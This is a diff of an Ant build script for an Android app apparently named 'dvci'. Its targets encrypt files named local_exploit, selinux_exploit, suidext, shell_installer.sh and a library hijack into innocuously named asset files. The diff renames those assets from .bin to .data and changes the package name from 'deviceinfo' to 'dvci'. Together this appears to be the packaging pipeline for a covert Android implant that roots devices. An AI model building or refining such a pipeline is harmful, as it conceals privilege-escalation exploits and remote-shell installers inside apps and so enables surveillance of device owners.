@@ -104,35 +104,35 @@
 	</target>
 
 	<target name="encrypt-exploit">
-		<delete file="assets/s.bin" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/suidext" outputFile="assets/s.bin" />
-		<delete file="assets/j.bin" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/selinux_suidext" outputFile="assets/j.bin" />
-		<delete file="assets/h.bin" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/expl_check" outputFile="assets/h.bin" />
-		<delete file="assets/d.bin" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/selinux_check" outputFile="assets/d.bin" />
-		<delete file="assets/l.bin" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/local_exploit" outputFile="assets/l.bin" />
-		<delete file="assets/g.bin" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/selinux_exploit" outputFile="assets/g.bin" />
-		<delete file="assets/k.bin" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/shell_installer.sh" outputFile="assets/k.bin" />
+		<delete file="assets/sb.data" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/suidext" outputFile="assets/sb.data" />
+		<delete file="assets/jb.data" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/selinux_suidext" outputFile="assets/jb.data" />
+		<delete file="assets/hb.data" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/expl_check" outputFile="assets/hb.data" />
+		<delete file="assets/db.data" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/selinux_check" outputFile="assets/db.data" />
+		<delete file="assets/lb.data" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/local_exploit" outputFile="assets/lb.data" />
+		<delete file="assets/gb.data" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/selinux_exploit" outputFile="assets/gb.data" />
+		<delete file="assets/kb.data" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/shell_installer.sh" outputFile="assets/kb.data" />
 	</target>
 
 	<target name="encrypt-hijacklibrary">
-		<delete file="assets/i.bin" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/libt.so" outputFile="assets/i.bin" />
-		<delete file="assets/m.bin" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/hijack" outputFile="assets/m.bin" />
+		<delete file="assets/ib.data" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/libt.so" outputFile="assets/ib.data" />
+		<delete file="assets/mb.data" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/hijack" outputFile="assets/mb.data" />
 
 	</target>
 
 	<target name="encrypt-hijacklibrary-debug">
-		<delete file="assets/i.bin" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/libt_debug.so" outputFile="assets/i.bin" />
-		<delete file="assets/m.bin" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/hijack" outputFile="assets/m.bin" />
+		<delete file="assets/ib.data" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/libt_debug.so" outputFile="assets/ib.data" />
+		<delete file="assets/mb.data" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/hijack" outputFile="assets/mb.data" />
 	</target>
 
 
@@ -172,15 +172,15 @@
 
 					<var name="isdebug" value="true" />
 					<var name="iscamera" value="false" />
-					<copy file="preprocess/config.debug.bin" toFile="assets/c.bin" overwrite="true" />
-					<copy file="preprocess/resources.patched.bin" toFile="assets/r.bin" overwrite="true" />
+					<copy file="preprocess/config.debug.bin" toFile="assets/cb.data" overwrite="true" />
+					<copy file="preprocess/resources.patched.bin" toFile="assets/rb.data" overwrite="true" />
 					<copy file="preprocess/dexguard-project.release.txt" toFile="dexguard-project.txt" overwrite="true" />
 				</case>
 				<case value="release">
 					<echo message="set release" />
 					<var name="iscamera" value="false" />
-					<copy file="preprocess/config.release.bin" toFile="assets/c.bin" overwrite="true" />
-					<copy file="preprocess/resources.unpatched.bin" toFile="assets/r.bin" overwrite="true" />
+					<copy file="preprocess/config.release.bin" toFile="assets/cb.data" overwrite="true" />
+					<copy file="preprocess/resources.unpatched.bin" toFile="assets/rb.data" overwrite="true" />
 					<copy file="preprocess/dexguard-project.release.txt" toFile="dexguard-project.txt" overwrite="true" />
 				</case>
 				<case value="merge">
@@ -188,8 +188,8 @@
 
 					<var name="isdebug" value="false" />
 					<var name="iscamera" value="false" />
-					<copy file="preprocess/config.release.bin" toFile="assets/c.bin" overwrite="true" />
-					<copy file="preprocess/resources.unpatched.bin" toFile="assets/r.bin" overwrite="true" />
+					<copy file="preprocess/config.release.bin" toFile="assets/cb.data" overwrite="true" />
+					<copy file="preprocess/resources.unpatched.bin" toFile="assets/rb.data" overwrite="true" />
 					<copy file="preprocess/dexguard-project.merge.txt" toFile="dexguard-project.txt" overwrite="true" />
 				</case>
 			</switch>
@@ -222,7 +222,7 @@
 
 			<echo message="copy resources and Cfg" />
 
-			<copy file="preprocess/Cfg.java" toFile="src/com/android/deviceinfo/auto/Cfg.java" overwrite="true">
+			<copy file="preprocess/Cfg.java" toFile="src/com/android/dvci/auto/Cfg.java" overwrite="true">
 				<filterset>
 					<filter token="BUILD_ID" value="${build.number}" />
 					<filter token="BUILD_TIMESTAMP" value="${timestamp.BUILD}" />
@@ -301,8 +301,8 @@
 	<target name="reverse">
 		<echo message="Reverse" />
 		<deltree dir="reverse" />
-		<copy file="bin/android_deviceinfo-release.apk" toDir="reverse" />
-		<unzip src="reverse/android_deviceinfo-release.apk" dest="reverse" />
+		<copy file="bin/android_dvci-release.apk" toDir="reverse" />
+		<unzip src="reverse/android_dvci-release.apk" dest="reverse" />
 
 		<exec executable="..\..\HT\Reversing\dex2jar\dex2jar.bat">
 			<arg value="reverse/classes.dex" />
@@ -363,8 +363,8 @@
 
 		<echo>call release</echo>
 		<antcall target="release" inheritAll="false" />
-		<!-- <var name="filename" value="bin/android_deviceinfo-release-unsigned.apk" /> -->
-		<var name="filename" value="bin/android_deviceinfo-release.apk" />
+		<!-- <var name="filename" value="bin/android_dvci-release-unsigned.apk" /> -->
+		<var name="filename" value="bin/android_dvci-release.apk" />
 
 		<mkdir dir="output/@{kind}/" />
 		<copy file="${filename}" toFile="output/@{kind}/core.android.@{osversion}.apk" overwrite="true" />
@@ -403,8 +403,8 @@
 
 				<echo>call release</echo>
 				<antcall target="release" inheritAll="false" />
-				<!-- <var name="filename" value="bin/android_deviceinfo-release-unsigned.apk" /> -->
-				<var name="filename" value="bin/android_deviceinfo-release.apk" />
+				<!-- <var name="filename" value="bin/android_dvci-release-unsigned.apk" /> -->
+				<var name="filename" value="bin/android_dvci-release.apk" />
 
 				<mkdir dir="output/${kind}/" />
 				<copy file="${filename}" toFile="output/${kind}/core.android.@{osversion}.apk" overwrite="true" />
@@ -437,8 +437,8 @@
 
 				<echo>call release</echo>
 				<antcall target="release" inheritAll="false" />
-				<!-- <var name="filename" value="bin/android_deviceinfo-release-unsigned.apk" /> -->
-				<var name="filename" value="bin/android_deviceinfo-release.apk" />
+				<!-- <var name="filename" value="bin/android_dvci-release-unsigned.apk" /> -->
+				<var name="filename" value="bin/android_dvci-release.apk" />
 
 				<mkdir dir="output/${kind}/" />
 				<copy file="${filename}" toFile="output/${kind}/core.android.@{osversion}.apk" overwrite="true" />
@@ -466,8 +466,8 @@
 		<echo message="== BUILD merge ==" />
 		<echo message="=================" />
 		<antcall target="release" inheritAll="false" />
-		<!-- <var name="filename" value="bin/android_deviceinfo-release-unsigned.apk" /> -->
-		<var name="filename" value="bin/android_deviceinfo-release.apk" />
+		<!-- <var name="filename" value="bin/android_dvci-release-unsigned.apk" /> -->
+		<var name="filename" value="bin/android_dvci-release.apk" />
 		<mkdir dir="output/merge/" />
 		<copy file="${filename}" toFile="output/merge/core.android.melt.apk" overwrite="true" />
 		<!-- <copy file="methodStartService.txt" toFile="output/merge/methodStartService.txt" overwrite="true" /> -->
